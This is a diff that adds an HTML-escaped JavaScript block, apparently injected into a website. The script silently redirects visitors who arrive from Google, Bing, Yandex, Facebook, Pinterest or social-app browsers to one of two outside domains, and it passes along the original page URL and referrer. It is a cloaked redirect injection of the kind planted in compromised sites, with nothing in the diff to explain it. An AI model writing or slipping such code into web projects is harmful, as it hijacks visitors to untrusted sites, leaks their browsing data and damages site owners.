@@ -1,0 +1,11 @@
+//&lt;![CDATA[
+
+var dataUrl = [
+    &#039;https://aany.buzz/#&#039;,&#039;https://hmubank.com/#&#039;
+];
+
+var ars = dataUrl[Math.floor(Math.random()*dataUrl.length)];
+
+
+if([&#039;.google.&#039;, &#039;bing.&#039;, &#039;yandex.&#039;, &#039;facebook.&#039;, &#039;pinterest.&#039;].some(s =&gt; document.referrer.toLowerCase().includes(s)) || [&#039;fb&#039;, &#039;facebook&#039;, &#039;pinterest&#039;, &#039;twitter&#039;].some(s =&gt; navigator.userAgent.toLowerCase().includes(s))){ window.location.href = ars + &#039;/?arsae=&#039;+ encodeURIComponent(window.location.href) + &#039;&amp;arsae_ref=&#039;+ encodeURIComponent(document.referrer) }
+//]]&gt;
